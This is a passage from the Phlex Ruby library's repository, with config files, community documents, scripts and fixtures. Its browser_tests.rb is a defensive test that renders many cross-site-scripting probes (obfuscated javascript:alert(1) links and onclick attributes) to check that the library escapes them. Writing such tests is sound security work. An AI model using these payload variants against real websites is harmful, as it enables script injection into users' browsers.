 896 | Style/RedundantSelf:
 897 |   Enabled: true
 898 |
 899 | Style/RedundantSelfAssignmentBranch:
 900 |   Enabled: true
 901 |
 902 | Style/RedundantSort:
 903 |   Enabled: true
 904 |
 905 | Style/RedundantSortBy:
 906 |   Enabled: true
 907 |
 908 | Style/RedundantStringEscape:
 909 |   Enabled: true
 910 |
 911 | Style/RegexpLiteral:
 912 |   Enabled: true
 913 |   EnforcedStyle: slashes
 914 |   AllowInnerSlashes: false
 915 |
 916 | Style/RescueModifier:
 917 |   Enabled: true
 918 |
 919 | Style/RescueStandardError:
 920 |   Enabled: true
 921 |   EnforcedStyle: implicit
 922 |
 923 | Style/SafeNavigation:
 924 |   Enabled: true
 925 |
 926 | Style/Sample:
 927 |   Enabled: true
 928 |
 929 | Style/SelfAssignment:
 930 |   Enabled: true
 931 |
 932 | Style/Semicolon:
 933 |   Enabled: true
 934 |   AllowAsExpressionSeparator: true
 935 |
 936 | Style/Send:
 937 |   Enabled: true
 938 |
 939 | Style/SendWithLiteralMethodName:
 940 |   Enabled: true
 941 |   AllowSend: true
 942 |
 943 | Style/SignalException:
 944 |   Enabled: true
 945 |   EnforcedStyle: only_raise
 946 |
 947 | Style/SingleArgumentDig:
 948 |   Enabled: true
 949 |
 950 | Style/SingleLineDoEndBlock:
 951 |   Enabled: true
 952 |
 953 | Style/SoleNestedConditional:
 954 |   Enabled: true
 955 |   AllowModifier: false
 956 |
 957 | Style/StabbyLambdaParentheses:
 958 |   Enabled: true
 959 |   EnforcedStyle: require_parentheses
 960 |
 961 | Style/StderrPuts:
 962 |   Enabled: true
 963 |
 964 | Style/StringChars:
 965 |   Enabled: true
 966 |
 967 | Style/StringConcatenation:
 968 |   Enabled: true
 969 |   Mode: aggressive
 970 |
 971 | Style/StringLiterals:
 972 |   Enabled: true
 973 |   EnforcedStyle: double_quotes
 974 |
 975 | Style/StringLiteralsInInterpolation:
 976 |   Enabled: true
 977 |   EnforcedStyle: single_quotes
 978 |
 979 | Style/Strip:
 980 |   Enabled: true
 981 |
 982 | Style/SuperArguments:
 983 |   Enabled: true
 984 |
 985 | Style/SuperWithArgsParentheses:
 986 |   Enabled: true
 987 |
 988 | Style/SwapValues:
 989 |   Enabled: true
 990 |
 991 | Style/SymbolLiteral:
 992 |   Enabled: true
 993 |
 994 | Style/SymbolProc:
 995 |   Enabled: true
 996 |   AllowMethodsWithArguments: false
 997 |   AllowComments: true
 998 |
 999 | Style/TernaryParentheses:
1000 |   Enabled: true
1001 |   EnforcedStyle: require_parentheses_when_complex
1002 |   AllowSafeAssignment: true
1003 |
1004 | Style/TrailingBodyOnClass:
1005 |   Enabled: true
1006 |
1007 | Style/TrailingBodyOnMethodDefinition:
1008 |   Enabled: true
1009 |
1010 | Style/TrailingBodyOnModule:
1011 |   Enabled: true
1012 |
1013 | Style/TrailingCommaInArrayLiteral:
1014 |   Enabled: true
1015 |   EnforcedStyleForMultiline: comma
1016 |
1017 | Style/TrailingCommaInBlockArgs:
1018 |   Enabled: true
1019 |
1020 | Style/TrailingCommaInHashLiteral:
1021 |   Enabled: true
1022 |   EnforcedStyleForMultiline: comma
1023 |
1024 | Style/TrailingMethodEndStatement:
1025 |   Enabled: true
1026 |
1027 | Style/TrailingUnderscoreVariable:
1028 |   Enabled: true
1029 |   AllowNamedUnderscoreVariables: true
1030 |
1031 | Style/UnlessElse:
1032 |   Enabled: true
1033 |
1034 | Style/UnlessLogicalOperators:
1035 |   Enabled: true
1036 |   EnforcedStyle: forbid_mixed_logical_operators
1037 |
1038 | Style/UnpackFirst:
1039 |   Enabled: true
1040 |
1041 | Style/VariableInterpolation:
1042 |   Enabled: true
1043 |
1044 | Style/WhenThen:
1045 |   Enabled: true
1046 |
1047 | Style/WhileUntilDo:
1048 |   Enabled: true
1049 |
1050 | Style/YAMLFileRead:
1051 |   Enabled: true
1052 |


--------------------------------------------------------------------------------
/.rubocop-https---www-goodcop-style-tabs-yml:
--------------------------------------------------------------------------------
 1 | ---
 2 | inherit_from:
 3 |   - https://www.goodcop.style/base.yml
 4 |
 5 | Layout/IndentationStyle:
 6 |   EnforcedStyle: tabs
 7 |
 8 | Layout/IndentationWidth:
 9 |   Width: 1
10 |


--------------------------------------------------------------------------------
/.rubocop.yml:
--------------------------------------------------------------------------------
 1 | inherit_from:
 2 |   - "https://www.goodcop.style/tabs.yml"
 3 |
 4 | AllCops:
 5 |   TargetRubyVersion: 3.2
 6 |
 7 | # We need to disable this cop because it’s not compatible with TruffleRuby 23.1, which still needs a `require "set"`
 8 | Lint/RedundantRequireStatement:
 9 |   Enabled: false
10 |
11 | Layout/ExtraSpacing:
12 |   Enabled: false
13 |


--------------------------------------------------------------------------------
/.ruby-version:
--------------------------------------------------------------------------------
1 | 3.4.2
2 |


--------------------------------------------------------------------------------
/CODE_OF_CONDUCT.md:
--------------------------------------------------------------------------------
 1 | # Contributor Covenant Code of Conduct
 2 |
 3 | ## Our Pledge
 4 |
 5 | We as members, contributors, and leaders pledge to make participation in our community a harassment-free experience for everyone, regardless of age, body size, visible or invisible disability, ethnicity, sex characteristics, gender identity and expression, level of experience, education, socio-economic status, nationality, personal appearance, race, religion, or sexual identity and orientation.
 6 |
 7 | We pledge to act and interact in ways that contribute to an open, welcoming, diverse, inclusive, and healthy community.
 8 |
 9 | ## Our Standards
10 |
11 | Examples of behavior that contributes to a positive environment for our community include:
12 |
13 | * Demonstrating empathy and kindness toward other people
14 | * Being respectful of differing opinions, viewpoints, and experiences
15 | * Giving and gracefully accepting constructive feedback
16 | * Accepting responsibility and apologizing to those affected by our mistakes, and learning from the experience
17 | * Focusing on what is best not just for us as individuals, but for the overall community
18 |
19 | Examples of unacceptable behavior include:
20 |
21 | * The use of sexualized language or imagery, and sexual attention or
22 |   advances of any kind
23 | * Trolling, insulting or derogatory comments, and personal or political attacks
24 | * Public or private harassment
25 | * Publishing others' private information, such as a physical or email
26 |   address, without their explicit permission
27 | * Other conduct which could reasonably be considered inappropriate in a
28 |   professional setting
29 |
30 | ## Enforcement Responsibilities
31 |
32 | Community leaders are responsible for clarifying and enforcing our standards of acceptable behavior and will take appropriate and fair corrective action in response to any behavior that they deem inappropriate, threatening, offensive, or harmful.
33 |
34 | Community leaders have the right and responsibility to remove, edit, or reject comments, commits, code, wiki edits, issues, and other contributions that are not aligned to this Code of Conduct, and will communicate reasons for moderation decisions when appropriate.
35 |
36 | ## Scope
37 |
38 | This Code of Conduct applies within all community spaces, and also applies when an individual is officially representing the community in public spaces. Examples of representing our community include using an official e-mail address, posting via an official social media account, or acting as an appointed representative at an online or offline event.
39 |
40 | ## Enforcement
41 |
42 | Instances of abusive, harassing, or otherwise unacceptable behavior may be reported to the community leaders responsible for enforcement at joel@drapper.me. All complaints will be reviewed and investigated promptly and fairly.
43 |
44 | All community leaders are obligated to respect the privacy and security of the reporter of any incident.
45 |
46 | ## Enforcement Guidelines
47 |
48 | Community leaders will follow these Community Impact Guidelines in determining the consequences for any action they deem in violation of this Code of Conduct:
49 |
50 | ### 1. Correction
51 |
52 | **Community Impact**: Use of inappropriate language or other behavior deemed unprofessional or unwelcome in the community.
53 |
54 | **Consequence**: A private, written warning from community leaders, providing clarity around the nature of the violation and an explanation of why the behavior was inappropriate. A public apology may be requested.
55 |
56 | ### 2. Warning
57 |
58 | **Community Impact**: A violation through a single incident or series of actions.
59 |
60 | **Consequence**: A warning with consequences for continued behavior. No interaction with the people involved, including unsolicited interaction with those enforcing the Code of Conduct, for a specified period of time. This includes avoiding interactions in community spaces as well as external channels like social media. Violating these terms may lead to a temporary or permanent ban.
61 |
62 | ### 3. Temporary Ban
63 |
64 | **Community Impact**: A serious violation of community standards, including sustained inappropriate behavior.
65 |
66 | **Consequence**: A temporary ban from any sort of interaction or public communication with the community for a specified period of time. No public or private interaction with the people involved, including unsolicited interaction with those enforcing the Code of Conduct, is allowed during this period. Violating these terms may lead to a permanent ban.
67 |
68 | ### 4. Permanent Ban
69 |
70 | **Community Impact**: Demonstrating a pattern of violation of community standards, including sustained inappropriate behavior,  harassment of an individual, or aggression toward or disparagement of classes of individuals.
71 |
72 | **Consequence**: A permanent ban from any sort of public interaction within the community.
73 |
74 | ## Attribution
75 |
76 | This Code of Conduct is adapted from the [Contributor Covenant][homepage], version 2.0,
77 | available at https://www.contributor-covenant.org/version/2/0/code_of_conduct.html.
78 |
79 | Community Impact Guidelines were inspired by [Mozilla's code of conduct enforcement ladder](https://github.com/mozilla/diversity).
80 |
81 | [homepage]: https://www.contributor-covenant.org
82 |
83 | For answers to common questions about this code of conduct, see the FAQ at
84 | https://www.contributor-covenant.org/faq. Translations are available at https://www.contributor-covenant.org/translations.
85 |


--------------------------------------------------------------------------------
/CONTRIBUTING.md:
--------------------------------------------------------------------------------
 1 | # Contributing to Phlex
 2 |
 3 | ## Priorities
 4 |
 5 | We’re trying to provide the best possible developer experience for the people using Phlex in their apps and the best possible performance for the users of those apps.
 6 |
 7 | Phlex is incredibly complex and requires a lot of meta-programming but when you use it, it feels simple. Phlex views feel like plain old Ruby objects. You just subclass and define a couple of methods. That’s it. That’s how it should be.
 8 |
 9 | ## Setup
10 |
11 | - Install dependencies `bundle install`
12 | - Run the tests `bundle exec qt && bundle exec sus`
13 |
14 | ## Tests
15 |
16 | New tests should be written using [Quickdraw](https://github.com/joeldrapper/quickdraw) and placed in the `quickdraw` folder. You can run these tests with:
17 |
18 | ```
19 | bundle exec qt
20 | ```
21 |
22 | Previously, we used **[Sus](https://github.com/ioquatix/sus)**. Sus tests are in the `test` folder and can be run with:
23 |
24 | ```
25 | bundle exec sus
26 | ```
27 |
28 | ## Documentation
29 |
30 | Documentation is deployed when it’s merged into the `latest` branch with a release. But you can build and preview the docs locally by running `bin/docs`.
31 |


--------------------------------------------------------------------------------
/Gemfile:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | source "https://rubygems.org"
 4 | git_source(:github) { |repo| "https://github.com/#{repo}.git" }
 5 |
 6 | gemspec
 7 |
 8 | group :test do
 9 | 	gem "sus"
10 | 	gem "quickdraw", github: "joeldrapper/quickdraw"
11 | 	gem "simplecov", require: false
12 | 	gem "selenium-webdriver"
13 | end
14 |
15 | gem "nokogiri"
16 |
17 | group :development do
18 | 	gem "rubocop"
19 | 	gem "ruby-lsp"
20 | 	gem "benchmark-ips"
21 | end
22 |


--------------------------------------------------------------------------------
/LICENSE.txt:
--------------------------------------------------------------------------------
 1 | The MIT License (MIT)
 2 |
 3 | Copyright (c) 2022 Joel Drapper
 4 |
 5 | Permission is hereby granted, free of charge, to any person obtaining a copy
 6 | of this software and associated documentation files (the "Software"), to deal
 7 | in the Software without restriction, including without limitation the rights
 8 | to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 9 | copies of the Software, and to permit persons to whom the Software is
10 | furnished to do so, subject to the following conditions:
11 |
12 | The above copyright notice and this permission notice shall be included in
13 | all copies or substantial portions of the Software.
14 |
15 | THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
16 | IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
17 | FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
18 | AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
19 | LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
20 | OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
21 | THE SOFTWARE.
22 |


--------------------------------------------------------------------------------
/README.md:
--------------------------------------------------------------------------------
 1 | # Phlex
 2 |
 3 | Phlex lets you build object-oriented web views in pure Ruby.
 4 |
 5 | - [v2 Docs](https://www.phlex.fun)
 6 | - [v1 Docs](https://v1.phlex.fun)
 7 |
 8 | ## Versioning and Maintenance
 9 |
10 | Phlex does not follow Semantic Versioning (SemVer). Instead, we follow [BreakVer](https://www.taoensso.com/break-versioning).
11 |
12 | ### Security
13 |
14 | When a security issue is brought to our attention, we aim to release patches as soon as possible. We aim to patch with a new `non-breaking` version:
15 |
16 | - every `minor` version that was released in the last year;
17 | - the latest `minor` version of the latest two `major` versions, even if over a year old; and
18 | - the `main` branch in GitHub.
19 |


--------------------------------------------------------------------------------
/SECURITY.md:
--------------------------------------------------------------------------------
1 | # Security
2 |
3 | If you suspect you may have found a security vulnerability, please do not open a public issue or pull request. Instead, please [send us a private advisory](https://github.com/phlex-ruby/phlex/security/advisories/new).
4 |
5 | You should hear from us within a week, though we aim to release patches as quickly as possible. The last two security patches were released within a few hours of being reported privately to us.
6 |


--------------------------------------------------------------------------------
/bench.rb:
--------------------------------------------------------------------------------
 1 | #!/usr/bin/env ruby
 2 | # frozen_string_literal: true
 3 |
 4 | require "phlex"
 5 | require "benchmark/ips"
 6 |
 7 | require_relative "fixtures/page"
 8 | require_relative "fixtures/layout"
 9 |
10 | RubyVM::YJIT.enable
11 |
12 | sample = Example::Page.new.call
13 | puts sample.bytesize
14 |
15 | Benchmark.ips do |x|
16 | 	x.time = 5
17 | 	x.report("Page") { Example::Page.new.call }
18 | end
19 |


--------------------------------------------------------------------------------
/bin/console:
--------------------------------------------------------------------------------
1 | #!/usr/bin/env ruby
2 | # frozen_string_literal: true
3 |
4 | require "irb"
5 | require "phlex"
6 |
7 | IRB.start(__FILE__)
8 |


--------------------------------------------------------------------------------
/bin/coverage:
--------------------------------------------------------------------------------
1 | #!/usr/bin/env bash
2 | rm -rf ./coverage && COVERAGE=true bundle exec qt && open ./coverage/index.html
3 |


--------------------------------------------------------------------------------
/bin/test:
--------------------------------------------------------------------------------
1 | #!/usr/bin/env bash
2 | bundle exec qt && bundle exec sus && bundle exec rubocop && bundle exec ./browser_tests.rb && echo "🎉 All tests and checks passed!"
3 |


--------------------------------------------------------------------------------
/browser_tests.rb:
--------------------------------------------------------------------------------
  1 | #!/usr/bin/env ruby
  2 | # frozen_string_literal: true
  3 |
  4 | require "phlex"
  5 | require "selenium-webdriver"
  6 |
  7 | ASCII_CHARS = (0..127).to_set(&:chr)
  8 |
  9 | class Layout < Phlex::HTML
 10 | 	def view_template(&block)
 11 | 		doctype
 12 | 		html do
 13 | 			head do
 14 | 				meta(charset: "utf-8")
 15 | 			end
 16 |
 17 | 			body(&block)
 18 | 		end
 19 | 	end
 20 | end
 21 |
 22 | class JavaScriptLinks < Phlex::HTML
 23 | 	def initialize(char)
 24 | 		@char = char
 25 | 	end
 26 |
 27 | 	def view_template
 28 | 		render Layout do
 29 | 			# Standard JavaScript link
 30 | 			a(href: "javascript:alert(1)") { "x" }
 31 |
 32 | 			# With capitalization
 33 | 			a(href: "Javascript:alert(1)") { "x" }
 34 |
 35 | 			# With extra "javascript:" prefixes
 36 | 			a(href: "javascript:javascript:alert(1)") { "x" }
 37 | 			a(href: "javascript:javascript:javascript:alert(1)") { "x" }
 38 |
 39 | 			# With extra "javascript:" prefixes and capitalization
 40 | 			a(href: "javascript:Javascript:alert(1)") { "x" }
 41 | 			a(href: "Javascript:javascript:alert(1)") { "x" }
 42 |
 43 | 			a(href: "#{@char}javascript:alert(1)") { "x" }
 44 | 			a(href: "j#{@char}avascript:alert(1)") { "x" }
 45 | 			a(href: "ja#{@char}vascript:alert(1)") { "x" }
 46 | 			a(href: "jav#{@char}ascript:alert(1)") { "x" }
 47 | 			a(href: "java#{@char}script:alert(1)") { "x" }
 48 | 			a(href: "javas#{@char}cript:alert(1)") { "x" }
 49 | 			a(href: "javasc#{@char}ript:alert(1)") { "x" }
 50 | 			a(href: "javascr#{@char}ipt:alert(1)") { "x" }
 51 | 			a(href: "javascr#{@char}ipt:alert(1)") { "x" }
 52 | 			a(href: "javascri#{@char}pt:alert(1)") { "x" }
 53 | 			a(href: "javascrip#{@char}t:alert(1)") { "x" }
 54 | 			a(href: "javascript#{@char}:alert(1)") { "x" }
 55 | 			a(href: "javascript:#{@char}alert(1)") { "x" }
 56 |
 57 | 			a(href: "#{@char}#{@char}javascript:alert(1)") { "x" }
 58 | 			a(href: "j#{@char}#{@char}avascript:alert(1)") { "x" }
 59 | 			a(href: "ja#{@char}#{@char}vascript:alert(1)") { "x" }
 60 | 			a(href: "jav#{@char}#{@char}ascript:alert(1)") { "x" }
 61 | 			a(href: "java#{@char}#{@char}script:alert(1)") { "x" }
 62 | 			a(href: "javas#{@char}#{@char}cript:alert(1)") { "x" }
 63 | 			a(href: "javasc#{@char}#{@char}ript:alert(1)") { "x" }
 64 | 			a(href: "javascr#{@char}#{@char}ipt:alert(1)") { "x" }
 65 | 			a(href: "javascr#{@char}#{@char}ipt:alert(1)") { "x" }
 66 | 			a(href: "javascri#{@char}#{@char}pt:alert(1)") { "x" }
 67 | 			a(href: "javascrip#{@char}#{@char}t:alert(1)") { "x" }
 68 | 			a(href: "javascript#{@char}#{@char}:alert(1)") { "x" }
 69 | 			a(href: "javascript:#{@char}#{@char}alert(1)") { "x" }
 70 |
 71 | 			a(href: "#{@char}Javascript:alert(1)") { "x" }
 72 | 			a(href: "J#{@char}avascript:alert(1)") { "x" }
 73 | 			a(href: "Ja#{@char}vascript:alert(1)") { "x" }
 74 | 			a(href: "Jav#{@char}ascript:alert(1)") { "x" }
 75 | 			a(href: "Java#{@char}script:alert(1)") { "x" }
 76 | 			a(href: "Javas#{@char}cript:alert(1)") { "x" }
 77 | 			a(href: "Javasc#{@char}ript:alert(1)") { "x" }
 78 | 			a(href: "Javascr#{@char}ipt:alert(1)") { "x" }
 79 | 			a(href: "Javascr#{@char}ipt:alert(1)") { "x" }
 80 | 			a(href: "Javascri#{@char}pt:alert(1)") { "x" }
 81 | 			a(href: "Javascrip#{@char}t:alert(1)") { "x" }
 82 | 			a(href: "Javascript#{@char}:alert(1)") { "x" }
 83 | 			a(href: "Javascript:#{@char}alert(1)") { "x" }
 84 |
 85 | 			a(href: "#{@char}#{@char}Javascript:alert(1)") { "x" }
 86 | 			a(href: "J#{@char}#{@char}avascript:alert(1)") { "x" }
 87 | 			a(href: "Ja#{@char}#{@char}vascript:alert(1)") { "x" }
 88 | 			a(href: "Jav#{@char}#{@char}ascript:alert(1)") { "x" }
 89 | 			a(href: "Java#{@char}#{@char}script:alert(1)") { "x" }
 90 | 			a(href: "Javas#{@char}#{@char}cript:alert(1)") { "x" }
 91 | 			a(href: "Javasc#{@char}#{@char}ript:alert(1)") { "x" }
 92 | 			a(href: "Javascr#{@char}#{@char}ipt:alert(1)") { "x" }
 93 | 			a(href: "Javascr#{@char}#{@char}ipt:alert(1)") { "x" }
 94 | 			a(href: "Javascri#{@char}#{@char}pt:alert(1)") { "x" }
 95 | 			a(href: "Javascrip#{@char}#{@char}t:alert(1)") { "x" }
 96 | 			a(href: "Javascript#{@char}#{@char}:alert(1)") { "x" }
 97 | 			a(href: "Javascript:#{@char}#{@char}alert(1)") { "x" }
 98 | 		end
 99 | 	end
100 | end
101 |
102 | class XSSWithStrings < Phlex::HTML
103 | 	def view_template
104 | 		render Layout do
105 | 			File.open("fixtures/xss.txt") do |file|
106 | 				file.each_line do |line|
107 | 					div(class: line) { line }
108 | 					svg do |s|
109 | 						s.cdata(line)
110 | 						s.cdata { line }
111 | 					end
112 | 					erb_snippet(line:)
113 | 				end
114 | 			end
115 | 		end
116 | 	end
117 |
118 | 	erb :erb_snippet, <<~HTML, locals: %(line:)
119 | 		<%= @line %>
120 | 	HTML
121 | end
122 |
123 | class XSSWithSymbols < Phlex::HTML
124 | 	def view_template
125 | 		render Layout do
126 | 			File.open("fixtures/xss.txt") do |file|
127 | 				file.each_line do |line|
128 | 					div(class: line.to_sym) { line.to_sym }
129 | 				end
130 | 			end
131 | 		end
132 | 	end
133 | end
134 |
135 | class OnClick < Phlex::HTML
136 | 	def initialize(char)
137 | 		@char = char
138 | 	end
139 |
140 | 	def view_template
141 | 		render Layout do
142 | 			ignore_warnings { div("#{@char}onclick" => "alert(1)") { "x" } }
143 | 			ignore_warnings { div("o#{@char}nclick" => "alert(1)") { "x" } }
144 | 			ignore_warnings { div("on#{@char}click" => "alert(1)") { "x" } }
145 | 			ignore_warnings { div("onc#{@char}lick" => "alert(1)") { "x" } }
146 | 			ignore_warnings { div("oncl#{@char}ick" => "alert(1)") { "x" } }
147 | 			ignore_warnings { div("oncli#{@char}ck" => "alert(1)") { "x" } }
148 | 			ignore_warnings { div("onclic#{@char}k" => "alert(1)") { "x" } }
149 | 			ignore_warnings { div("onclick#{@char}" => "alert(1)") { "x" } }
150 |
151 | 			ignore_warnings { div("#{@char}#{@char}onclick" => "alert(1)") { "x" } }
152 | 			ignore_warnings { div("o#{@char}#{@char}nclick" => "alert(1)") { "x" } }
153 | 			ignore_warnings { div("on#{@char}#{@char}click" => "alert(1)") { "x" } }
154 | 			ignore_warnings { div("onc#{@char}#{@char}lick" => "alert(1)") { "x" } }
155 | 			ignore_warnings { div("oncl#{@char}#{@char}ick" => "alert(1)") { "x" } }
156 | 			ignore_warnings { div("oncli#{@char}#{@char}ck" => "alert(1)") { "x" } }
157 | 			ignore_warnings { div("onclic#{@char}#{@char}k" => "alert(1)") { "x" } }
158 | 			ignore_warnings { div("onclick#{@char}#{@char}" => "alert(1)") { "x" } }
159 |
160 | 			ignore_warnings { div("#{@char}onclick": "alert(1)") { "x" } }
161 | 			ignore_warnings { div("o#{@char}nclick": "alert(1)") { "x" } }
162 | 			ignore_warnings { div("on#{@char}click": "alert(1)") { "x" } }
163 | 			ignore_warnings { div("onc#{@char}lick": "alert(1)") { "x" } }
164 | 			ignore_warnings { div("oncl#{@char}ick": "alert(1)") { "x" } }
165 | 			ignore_warnings { div("oncli#{@char}ck": "alert(1)") { "x" } }
166 | 			ignore_warnings { div("onclic#{@char}k": "alert(1)") { "x" } }
167 | 			ignore_warnings { div("onclick#{@char}": "alert(1)") { "x" } }
168 |
169 | 			ignore_warnings { div("#{@char}#{@char}onclick": "alert(1)") { "x" } }
170 | 			ignore_warnings { div("o#{@char}#{@char}nclick": "alert(1)") { "x" } }
171 | 			ignore_warnings { div("on#{@char}#{@char}click": "alert(1)") { "x" } }
172 | 			ignore_warnings { div("onc#{@char}#{@char}lick": "alert(1)") { "x" } }
173 | 			ignore_warnings { div("oncl#{@char}#{@char}ick": "alert(1)") { "x" } }
174 | 			ignore_warnings { div("oncli#{@char}#{@char}ck": "alert(1)") { "x" } }
175 | 			ignore_warnings { div("onclic#{@char}#{@char}k": "alert(1)") { "x" } }
176 | 			ignore_warnings { div("onclick#{@char}#{@char}": "alert(1)") { "x" } }
177 | 		end
178 | 	end
179 |
180 | 	def ignore_warnings
181 | 		yield
182 | 	rescue ArgumentError
183 | 		# ignore
184 | 	end
185 | end
186 |
187 | class Browser
188 | 	MUTEX = { safari: Mutex.new, chrome: Mutex.new, firefox: Mutex.new }
189 |
190 | 	def self.open(driver)
191 | 		MUTEX.fetch(driver).synchronize do
192 | 			browser = new(Selenium::WebDriver.for(driver))
193 | 			yield(browser)
194 | 			browser.quit
195 | 		end
196 | 	end
197 |
198 | 	def self.open_each
199 | 		[:safari, :chrome, :firefox].map do |driver|
200 | 			Thread.new do
201 | 				self.open(driver) do |browser|
202 | 					yield(browser)
203 | 				end
204 | 			end
205 | 		end.each(&:join)
206 | 	end
207 |
208 | 	def initialize(driver)
209 | 		@driver = driver
210 | 	end
211 |
212 | 	attr_reader :driver
213 |
214 | 	def load_string(string)
215 | 		navigate_to("data:text/html,#{ERB::Util.url_encode(string)}")
216 | 	end
217 |
218 | 	def navigate_to(url)
219 | 		@driver.navigate.to(url)
220 | 	end
221 |
222 | 	def execute_script(script)
223 | 		@driver.execute_script(script)
224 | 	end
225 |
226 | 	def each_alert
227 | 		while (next_alert = alert)
228 | 			yield(next_alert)
229 | 		end
230 | 	end
231 |
232 | 	def alert
233 | 		@driver.switch_to.alert
234 | 	rescue Selenium::WebDriver::Error::NoSuchAlertError
235 | 		nil
236 | 	end
237 |
238 | 	def quit
239 | 		@driver.quit
240 | 	end
241 | end
242 |
243 | Browser.open_each do |browser|
244 | 	ASCII_CHARS.each do |char|
245 | 		browser.load_string(JavaScriptLinks.new(char).call)
246 | 		browser.execute_script("document.querySelectorAll('a').forEach(function(a) { a.click(); });")
247 | 		browser.each_alert do |alert|
248 | 			unless alert.text == "Safari cannot open the page because the address is invalid."
249 | 				raise "Failed with #{char.codepoints}"
250 | 			end
251 |
252 | 			alert.accept
253 | 		end
254 |
255 | 		browser.load_string(OnClick.new(char).call)
256 | 		browser.execute_script("document.querySelectorAll('div').forEach(function(div) { div.click(); });")
257 | 		browser.each_alert do
258 | 			raise "Failed with #{char.codepoints}"
259 | 		end
260 | 	end
261 |
262 | 	browser.load_string(XSSWithStrings.new.call)
263 | 	browser.execute_script("document.querySelectorAll('div').forEach(function(div) { div.click(); });")
264 |
265 | 	if browser.alert
266 | 		raise "Failed with strings"
267 | 	end
268 |
269 | 	browser.load_string(XSSWithSymbols.new.call)
270 | 	browser.execute_script("document.querySelectorAll('div').forEach(function(div) { div.click(); });")
271 |
272 | 	if browser.alert
273 | 		raise "Failed with symbols"
274 | 	end
275 | end
276 |


--------------------------------------------------------------------------------
/config/quickdraw.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | require "nokogiri"
 4 |
 5 | if ENV["COVERAGE"] == "true"
 6 | 	require "simplecov"
 7 |
 8 | 	SimpleCov.start do
 9 | 		command_name "quickdraw"
10 | 		enable_coverage_for_eval
11 | 		enable_for_subprocesses true
12 | 		enable_coverage :branch
13 | 		add_filter %r{^/fixtures/}
14 |
15 | 		add_group "SGML", "lib/phlex/sgml"
16 | 		add_group "HTML", "lib/phlex/html"
17 | 		add_group "SVG", "lib/phlex/svg"
18 | 		add_group "CSV", "lib/phlex/csv"
19 | 	end
20 | end
21 |
22 | Bundler.require :test
23 |
24 | require "phlex"
25 |
26 | Phlex::Loader.eager_load
27 |
28 | # Previous content of test helper now starts here
29 | $LOAD_PATH.unshift(File.expand_path("../fixtures", __dir__))
30 |


--------------------------------------------------------------------------------
/config/sus.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | require "simplecov"
 4 | SimpleCov.start do
 5 | 	enable_coverage :branch
 6 | end
 7 |
 8 | SimpleCov.command_name "Unit Tests"
 9 |
10 | require "phlex"
11 | require "bundler"
12 |
13 | Bundler.require :test
14 |
15 | require_relative "../fixtures/view_helper"
16 |


--------------------------------------------------------------------------------
/fixtures/components.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | module Components
 4 | 	extend Phlex::Kit
 5 |
 6 | 	autoload :SayHi, "components/say_hi"
 7 | 	autoload :Article, "components/article"
 8 |
 9 | 	module Foo
10 | 		class Bar < Phlex::HTML
11 | 			def view_template
12 | 				h1 { "Bar" }
13 | 			end
14 | 		end
15 | 	end
16 | end
17 |


--------------------------------------------------------------------------------
/fixtures/components/article.rb:
--------------------------------------------------------------------------------
1 | # frozen_string_literal: true
2 |
3 | class Components::Article < Phlex::HTML
4 | 	def view_template(&)
5 | 		article(&)
6 | 	end
7 | end
8 |


--------------------------------------------------------------------------------
/fixtures/components/say_hi.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | class Components::SayHi < Phlex::HTML
 4 | 	def initialize(name, times: 1)
 5 | 		@name = name
 6 | 		@times = times
 7 | 	end
 8 |
 9 | 	def view_template
10 | 		Article {
11 | 			@times.times { h1 { "Hi #{@name}" } }
12 | 			yield
13 | 		}
14 | 	end
15 | end
16 |


--------------------------------------------------------------------------------
/fixtures/layout.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | module Example
 4 | 	class LayoutComponent < Phlex::HTML
 5 | 		def initialize(title: "Example")
 6 | 			@title = title
 7 | 		end
 8 |
 9 | 		def view_template(&block)
10 | 			html do
11 | 				head do
12 | 					title { @title }
13 | 					meta name: "viewport", content: "width=device-width,initial-scale=1"
14 | 					link href: "/assets/tailwind.css", rel: "stylesheet"
15 | 				end
16 |
17 | 				body class: "bg-zinc-100" do
18 | 					nav class: "p-5", id: "main_nav" do
19 | 						ul do
20 | 							li(class: "p-5") { a(href: "/") { "Home" } }
21 | 							li(class: "p-5") { a(href: "/about") { "About" } }
22 | 							li(class: "p-5") { a(href: "/contact") { "Contact" } }
23 | 						end
24 | 					end
25 |
26 | 					div class: "container mx-auto p-5", &block
27 | 				end
28 | 			end
29 | 		end
30 | 	end
31 | end
32 |


--------------------------------------------------------------------------------
/fixtures/page.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | module Example
 4 | 	extend Phlex::Kit
 5 | 	class Page < Phlex::HTML
 6 | 		def view_template
 7 | 			LayoutComponent do
 8 | 				h1 { "Hi" }
 9 |
10 | 				100.times do
11 | 					table id: "test", class: "a b c d e f g" do
12 | 						tr do
13 | 							td id: "test", class: "a b c d e f g" do
14 | 								span { "Hi" }
15 | 							end
16 |
17 | 							td id: "test", class: "a b c d e f g" do
18 | 								span { "Hi" }
19 | 							end
20 |
21 | 							td id: "test", class: "a b c d e f g" do
22 | 								span { "Hi" }
23 | 							end
24 |
25 | 							td id: "test", class: "a b c d e f g" do
26 | 								span { "Hi" }
27 | 							end
28 |
29 | 							td id: "test", class: "a b c d e f g" do
30 | 								span { "Hi" }
31 | 							end
32 | 						end
33 | 					end
34 | 				end
35 | 			end
36 | 		end
37 | 	end
38 | end
39 |


--------------------------------------------------------------------------------
/fixtures/sgml_helper.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | module SGMLHelper
